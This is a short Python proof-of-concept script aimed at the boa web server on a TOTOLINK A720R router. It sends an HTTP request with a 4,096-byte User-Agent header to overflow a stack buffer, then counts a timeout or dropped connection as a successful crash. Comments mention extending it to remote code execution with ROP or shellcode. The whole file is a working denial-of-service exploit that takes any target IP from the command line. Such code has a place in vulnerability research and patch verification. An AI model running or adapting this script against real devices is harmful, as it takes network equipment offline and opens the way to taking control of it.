#!/usr/bin/env python3
import socket
import sys

def exploit_totolink(target_ip, target_port=8080):
    print(f"[*] Targeting TOTOLINK A720R boa at {target_ip}:{target_port}...")
    
    # We construct a malicious HTTP request with a long User-Agent
    # to trigger the observed stack corruption (PC=0 at offset 2b32fc54)
    
    buf_len = 4096
    payload = b"A" * buf_len # Junk to trigger overflow
    
    # In a real RCE, we would calculate offset to RA and inject ROP/Shellcode
    # Here we just verify the crash
    
    request = (
        b"GET /index.html HTTP/1.1\r\n"
        b"Host: " + target_ip.encode() + b"\r\n"
        b"User-Agent: " + payload + b"\r\n"
        b"Connection: close\r\n\r\n"
    )

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, target_port))
        print("[*] Sending malicious request...")
        s.send(request)
        
        # We expect a crash/disconnect
        data = s.recv(1024)
        print(f"[-] Received response: {data[:50]!r}")
        print("[-] Target seems alive. Buffer might be too small or wrong header.")
    except socket.timeout:
        print("[+] SUCCESS: Connection timed out. Target likely CRASHED!")
    except ConnectionResetError:
        print("[+] SUCCESS: Connection reset. Target definitely CRASHED!")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    ip = "127.0.0.1"
    if len(sys.argv) > 1:
        ip = sys.argv[1]
    exploit_totolink(ip)
